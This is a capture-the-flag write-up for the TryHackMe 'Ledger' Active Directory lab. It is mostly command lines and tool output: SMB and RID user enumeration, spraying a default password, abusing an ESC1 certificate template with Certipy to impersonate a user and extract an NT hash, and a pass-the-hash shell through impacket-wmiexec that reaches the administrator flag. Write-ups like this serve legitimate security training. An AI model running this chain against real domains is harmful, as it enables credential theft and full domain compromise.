<p align="center">May 6, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{366}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/730584a5-e81b-4a5e-9cb5-b888b92e5705" alt="streak"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Ledger}}$$</h1>
<p align="center"><em>This challenge simulates a real cyber-attack scenario where you must exploit an Active Directory.</em>!<br>
It is classified as a hard-level CTF.<br>
It is premium: only for subscribers.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/ledger">here</a>.</p>

<p align="center"> <img width="1000px" src=""> </p>


<br>
<br>

<h2>Task 1 . Find the Flags</h2>
<p>Start the virtual machine by pressing the Start Machine button attached in this task. You may access the VM by using the AttackBox or your VPN connection.<br><br>

Can you find all the flags?<br><br>

Note: The VM takes about 5 minutes to fully boot up. All the necessary tools are already available on the AttackBox.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>What is the user flag? </em><br><a id='1.1'></a>
>> <strong><code>___________________________</code></strong><br>
<p></p>

<br>

> 1.2. <em>What is the root flag? </em><br><a id='1.2'></a>
>> <strong><code>___________________________</code></strong><br>
<p></p>


<br>

<h3><code>nmap</code></h3>

<p>There are many ports open.<br><br>
- port <code> 53/tcp</code>:<code>domain?</code><br>
- port <code> 80/tcp</code>:<code>http</code><br>
- port <code> 88/tcp</code>:<code>kerberos-sec</code><br>
- port <code>135/tcp</code>:<code>msrpc</code><br>
- port <code>139/tcp</code>:<code>netbios-ssn</code><br>
- port <code>389/tcp</code>:<code>ldap</code><br>
- port <code>443/tcp</code>:<code>ssl/httpp</code><br>
- port <code>445/tcp</code>:<code>microsoft-ds?/httpp</code><br>
- port <code>464/tcp</code>:<code>kpasswd5?</code><br>
- port <code>593/tcp</code>:<code>ncacn_http</code><br>
- port <code>636/tcp</code>:<code>ssl/ldap</code><br>
- port <code>3268/tcp</code>:<code>ldap</code><br>
 ...<br><br>

- <code>labyrinth.thm.local</code>, <code>thm.local</code> and <code>LABYTINTH</code></p>


<br>

```bash
:~/Ledger# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-xx-xx xx:xx:xxZ)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-xx-xxTxx:xx:xx
|_Not valid after:  2025-xx-xxTxx:xx:xx
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-xx-xxTxx:xx:xx
|_Not valid after:  2028-xx-xxTxx:xx:xx
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-xx-xxTxx:xx:xx
|_Not valid after:  2025-xx-xxTxx:xx:xx
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-xx-xxTxx:xx:xx
|_Not valid after:  2025-xx-xxTxx:xx:xx
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-xx-xxTxx:xx:xx
|_Not valid after:  2025-xx-xxTxx:xx:xx
|_ssl-date: 2025-05-07T01:38:58+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: LABYRINTH
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: labyrinth.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-xx-xxTxx:xx:xx+00:00
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2025-xx-xxTxx:xx:xx
|_Not valid after:  2025-xx-xxTxx:xx:xx
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49782/tcp open  msrpc         Microsoft Windows RPC
...
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: LABYRINTH, NetBIOS user: <unknown>, NetBIOS MAC: 02:bd:f8:a3:f8:6f (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-xx-xxTxx:xx:xx
|_  start_date: N/A
...
```

<br>

```bash
:~/Ledger# nmap -sC -sV -Pn -p47001,49664,49665,49666,49667,49669,49670,49671,49675,49676,49682,49700,49713,49719,49782 -T4 TargetIP
...
PORT      STATE SERVICE       VERSION
PORT      STATE  SERVICE    VERSION
47001/tcp open   http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc      Microsoft Windows RPC
49665/tcp open   msrpc      Microsoft Windows RPC
49666/tcp open   msrpc      Microsoft Windows RPC
49667/tcp open   msrpc      Microsoft Windows RPC
49669/tcp open   msrpc      Microsoft Windows RPC
49670/tcp open   ncacn_http Microsoft Windows RPC over HTTP 1.0
49671/tcp open   msrpc      Microsoft Windows RPC
49675/tcp open   msrpc      Microsoft Windows RPC
49676/tcp open   msrpc      Microsoft Windows RPC
49682/tcp closed unknown
49700/tcp closed unknown
49713/tcp open   msrpc      Microsoft Windows RPC
49719/tcp closed unknown
49782/tcp closed unknown
```

<br>

<h3><code>/etc/hosts</code></h3>

```bash
TargetIP    labyrinth.thm.local thm.local LABYTINTH  
```

<h3>ping</h3>

```bash
:~/Ledger# ping labyrinth.thm.local
PING labyrinth.thm.local (TargetIP) 56(84) bytes of data.
64 bytes from labyrinth.thm.local (TargetIP): icmp_seq=1 ttl=128 time=0.296 ms
...
```

<h3>labyrinth.thm.local</h3>

<img width="1130" height="635" alt="image" src="https://github.com/user-attachments/assets/00232287-3733-4ece-a35a-f095e1aafe4e" />

<br>

<h3>Gobuster</h3>

```bash
:~/Ledger# gobuster dir -u http://labyrinth.thm.local -w /usr/share/wordlists/dirb/common.txt
...
/aspnet_client        (Status: 301) [Size: 164] [--> http://labyrinth.thm.local/aspnet_client/]
```

<br>

<h3>smbclient</h3>

```bash
:~/Ledger# smbclient -L TargetIP -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

```bash
:~/Ledger# smbclient //TargetIP/ADMIN$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

```bash
:~/Ledger# smbclient //TargetIP/C$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

```bash
:~/Ledger# smbclient //TargetIP/IPC$ -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> cd
Current directory is \
smb: \> exit
```

<br>

<h3>smbmap</h3>

```bash
:~/Ledger# smbmap -u 'guest' -p '' -H TargetIP
[+] Finding open SMB ports....
[+] User SMB session established on TargetIP...
[+] IP: TargetIP:445	Name: labyrinth.thm.local                               
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	lsass
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	ntsvcs
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	scerpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-37c-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	epmapper
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-210-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	eventlog
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-454-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	atsvc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-6d4-0
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	TermSrv_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	Ctx_WinStation_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	SessEnvPublicRpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-8b8-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-27c-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-27c-1
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\49670
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	fb7eae2373ab1861
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\593
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	srvsvc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-978-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	spoolss
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-b90-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	netdfs
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	Amazon\SSM\InstanceData\health
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	Amazon\SSM\InstanceData\termination
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-268-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	W32TIME_ALT
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-cb4-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	cert
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-bc0-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	iisipm6767c469-c773-435e-929e-a2100b788abf
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	iislogpipec947ae60-4402-4553-8517-a16535611c8a
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Yr656woQGFFGt5bVIGBnaxyMp5OaN3LywSbSFEnNCuOPpJCHshwlPdHCVgh4XUkPOWX4ObOsQDDAC1S37KK83TMmruW949MmyB8GwpnO4IkHgJ3vxzxMRA
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	CPFATP_64_v4.0.30319
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-83c-0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
```

<br>

<h3><code>crackmapexec</code></h3>

```bash
:~/Ledger# crackmapexec smb TargetIP -u 'guest' -p ''
SMB         TargetIP    445    LABYRINTH        [*] Windows 10.0 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         TargetIP    445    LABYRINTH        [+] thm.local\guest: 
```

<p>or</p>

```bash
:~/Ledger# nxc smb ledger.thm -u guest -p ''
SMB         TargetIP    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         TargetIP    445    LABYRINTH        [+] thm.local\guest: 
```


<h4>shares</h4>

```bash
:~/Ledger# nxc smb ledger.thm -u guest -p '' --shares
SMB         TargetIP    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False) 
SMB         TargetIP    445    LABYRINTH        [+] thm.local\guest: 
SMB         TargetIP    445    LABYRINTH        [*] Enumerated shares
SMB         TargetIP    445    LABYRINTH        Share           Permissions     Remark
SMB         TargetIP    445    LABYRINTH        -----           -----------     ------
SMB         TargetIP    445    LABYRINTH        ADMIN$                          Remote Admin
SMB         TargetIP    445    LABYRINTH        C$                              Default share
SMB         TargetIP    445    LABYRINTH        IPC$            READ            Remote IPC
SMB         TargetIP    445    LABYRINTH        NETLOGON                        Logon server share 
SMB         TargetIP    445    LABYRINTH        SYSVOL                          Logon server share 
```

<h4>users</h4>

```bash
:~/Ledger# nxc smb ledger.thm -u guest -p '' --rid
...
SMB         TargetIP    445    LABYRINTH        1147: THM\DION_SANTOS (SidTypeUser)
SMB         TargetIP    445    LABYRINTH        1148: THM\LAVERN_GOODWIN (SidTypeUser)
SMB         TargetIP    445    LABYRINTH        1149: THM\BRENTON_HENRY (SidTypeUser)
SMB         TargetIP    445    LABYRINTH        1150: THM\ROB_SALAZAR (SidTypeUser)
SMB         TargetIP    445    LABYRINTH        1151: THM\RITA_HOWE (SidTypeUser)
SMB         TargetIP    445    LABYRINTH        1152: THM\LETITIA_BERG (SidTypeUser)
SMB         TargetIP    445    LABYRINTH        1153: THM\CECILE_PATRICK (SidTypeUser)
SMB         10.201.45.33    445    LABYRINTH        1154: THM\PRINCE_HOFFMAN (SidTypeUser)
SMB         10.201.45.33    445    LABYRINTH        1155: THM\KURT_GILMORE (SidTypeUser)
SMB         10.201.45.33    445    LABYRINTH        1156: THM\JASPER_GARDNER (SidTypeUser)
SMB         10.201.45.33    445    LABYRINTH        1157: THM\YVONNE_NEWTON (SidTypeUser)
SMB         10.201.45.33    445    LABYRINTH        1158: THM\SHELLEY_BEARD (SidTypeUser)
SMB         10.201.45.33    445    LABYRINTH        1159: THM\SILAS_WALLS (SidTypeUser)
SMB         10.201.45.33    445    LABYRINTH        1160: THM\AMOS_MCPHERSON (SidTypeUser)
...
```


```bash
:~/Ledger# nxc smb ledger.thm -u usernames.txt -p 'CHANGEME2023!' --continue-on-success
SMB         TargetIP    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False) 
SMB         TargetIP    445    LABYRINTH        [+] thm.local\IVY_WILLIS:CHANGEME2023! 
SMB         TargetIP    445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
```


```bash
:~/Ledger# bloodhound-python -d thm.local -c All -u 'IVY_WILLIS' -p 'CHANGEME2023!' -ns TargetIP --dns-tcp
NFO: Found AD domain: thm.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 493 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: labyrinth.thm.local
INFO: Done in 00M 05S
```

<h3>Remmina</h3>

<p>

- SUSANNA_MCKNIGHT<br>
- CHANGEME2023!<br>
- thm.local
</p>


<img width="1069" height="634" alt="image" src="https://github.com/user-attachments/assets/8353e201-9e54-459e-853b-7536a4fe3e5b" />

<br>
<br>

<h3>certipy-ad</h3>

```bash
:~/Ledger# python3 -m venv venv
:~/Ledger# source venv/bin/activate
(venv) :~/Ledger# 
...
```

<br>

<h3>/etc/hosts</h3>

```bash
TargetIP    ledger.thm labyrinth.thm.local thm.local LABYRINTH thm-LABYRINTH-CA
```

<br>

<h3>certipy</h3>

```bash
(venv) :~/Ledger#  certipy find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target labyrinth.thm.local -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA
[!] Got error while trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via RRP
[*] Got CA configuration for 'thm-LABYRINTH-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
  1
    Template Name                       : Computer2
    Display Name                        : Computer2
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
...
```


```bash
(venv) :~/Ledger#  certipy req -u 'Susanna_McKnight@thm.local' -p 'CHANGEME2023!' -dc-ip 'TargetIP' -target 'labyrinth.thm.local' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'Bradley_Ortiz@thm.local'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 32
[*] Got certificate with UPN 'Bradley_Ortiz@thm.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'bradley_ortiz.pfx'
```

```bash
(venv) :~/Ledger#  certipy auth -pfx bradley_ortiz.pfx -dc-ip TargetIP
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: bradley_ortiz@thm.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'bradley_ortiz.ccache'
[*] Trying to retrieve NT hash for 'bradley_ortiz'
[*] Got hash for 'bradley_ortiz@thm.local': ........1404ee:16ec31963c93240962b7e60fd97b495d
```

```bash
(venv) :~/Ledger#  apt install python3-impacket
```

```bash
(venv) :~/Ledger#  impacket-wmiexec -hashes ........1404ee:16ec31963c93240962b7e60fd97b495d THM.LOCAL/bradley_ortiz@labyrinth.thm.local
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

```bash
C:\>whoami
thm\bradley_ortiz
```

```bash
C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```


```bash
C:\>cd C:Users\Administrator\Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/31/2023  08:18 AM    <DIR>          .
05/31/2023  08:18 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/31/2023  07:33 AM                29 root.txt
               3 File(s)          1,110 bytes
               2 Dir(s)  12,527,595,520 bytes free
```


```bash
C:\Users\Administrator\Desktop>type root.txt
THM{REDACTED}
```


<img width="1388" height="775" alt="image" src="https://github.com/user-attachments/assets/da6019fb-d559-4c34-8dab-7c875fe467cf" />


<br>
<br>

<img width="1906" height="883" alt="image" src="https://github.com/user-attachments/assets/3dae5c81-4a75-4432-b5ce-0beae6f15d44" />


<br>

![image](https://github.com/user-attachments/assets/d0eea22e-f924-4d37-95fc-a73d3579038a)




